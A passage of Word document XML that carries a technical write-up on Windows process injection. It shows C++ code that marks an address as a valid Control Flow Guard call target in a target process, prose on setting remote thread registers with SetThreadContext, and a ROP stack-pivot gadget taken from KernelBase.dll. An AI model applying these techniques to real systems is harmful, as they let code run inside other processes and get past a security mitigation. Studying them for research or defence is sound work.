    <w:p w14:paraId="3751BD3E" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D5B203" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>void</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> markCFGValid(</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unsigned</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>long</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>long</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ptrToMarkValid</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021B09AA" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624E79CD" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CFG_CALL_TARGET_INFO</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> info;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A38C68" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">info.Flags = </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CFG_CALL_TARGET_VALID</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="584E67F1" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">info.Offset = </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ptrToMarkValid</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F6739F" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53BE8A41" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (!SetProcessValidCallTargets_(targetProcess, targetModuleBase, sizeOfImage, 1, &amp;info))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCAC43E" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>throw</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> std::</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>exception</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"SetProcessValidCallTargets failed"</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50125D35" w14:textId="425DE541" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00B6130C">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8E9810" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Function arguments</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586C8789" w14:textId="6AFC6DE0" w:rsidR="00CA67EE" w:rsidRPr="001E7AD6" w:rsidRDefault="00385855" w:rsidP="00C754FE">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Somewhat frustratingly, CreateRemoteThread can only be used to call functions with one argument. While this isn’t a problem for some</w:t>
      </w:r>
      <w:r w:rsidR="00560B06" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> purposes</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="006A0864" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>it would be nice</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006A0864" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">to have </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">the ability to </w:t>
      </w:r>
      <w:r w:rsidR="006A0864" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">pass up to four arguments </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">in the </w:t>
      </w:r>
      <w:r w:rsidR="006A0864" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">usual </w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>registers (rcx, rdx, r8</w:t>
      </w:r>
      <w:r w:rsidR="006A0864" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, and r9</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>). We achieve this by starting our thread in a suspen</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ded state, and then modifying its registers directly via SetThreadContext, before resuming it. Due to the </w:t>
      </w:r>
      <w:r w:rsidR="006A0864" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>intricacies</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of Windows threading, we can’t change RSP in this manner, so we</w:t>
      </w:r>
      <w:r w:rsidR="00560B06" w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>’ll</w:t>
      </w:r>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> go through a ROP-style stack pivot first.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569877FF" w14:textId="57766C48" w:rsidR="003D7792" w:rsidRPr="001E7AD6" w:rsidRDefault="003D7792" w:rsidP="00C754FE">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001E7AD6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>We will use the following stack pivot, found in KernelBase.dll:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7524E191" w14:textId="77777777" w:rsidR="00560B06" w:rsidRPr="004B4AA4" w:rsidRDefault="00560B06" w:rsidP="00C754FE">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32405AB0" w14:textId="77777777" w:rsidR="003D7792" w:rsidRPr="004B4AA4" w:rsidRDefault="003D7792" w:rsidP="003D7792">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>49 8b e3</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>mov rsp, r11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E3DEBD" w14:textId="77777777" w:rsidR="003D7792" w:rsidRPr="004B4AA4" w:rsidRDefault="003D7792" w:rsidP="003D7792">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>41 5e</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>pop r14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E4D977" w14:textId="77777777" w:rsidR="003D7792" w:rsidRPr="004B4AA4" w:rsidRDefault="003D7792" w:rsidP="003D7792">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>c3</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">ret </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C5E857" w14:textId="77777777" w:rsidR="00560B06" w:rsidRPr="004B4AA4" w:rsidRDefault="00560B06" w:rsidP="00C754FE">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="1" w:author="Chris Thompson" w:date="2019-08-05T15:49:00Z"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
